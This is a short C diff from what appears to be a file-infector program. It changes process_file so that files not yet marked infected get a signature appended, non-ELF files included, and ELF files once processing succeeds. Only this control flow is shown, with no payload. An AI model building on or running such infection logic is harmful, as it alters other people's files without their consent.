@@ -12,8 +12,11 @@ void process_file(const char *path)
 	}
 
 	if (!is_file_infected(&file)) {
-		if (is_valid_elf(&file))
-			process_elf(&file);
+		if (is_valid_elf(&file)) {
+			if (process_elf(&file))
+				sign_generic_append(&file);
+		} else
+			sign_generic_append(&file);
 	}
 
 	unmap_file(&file);
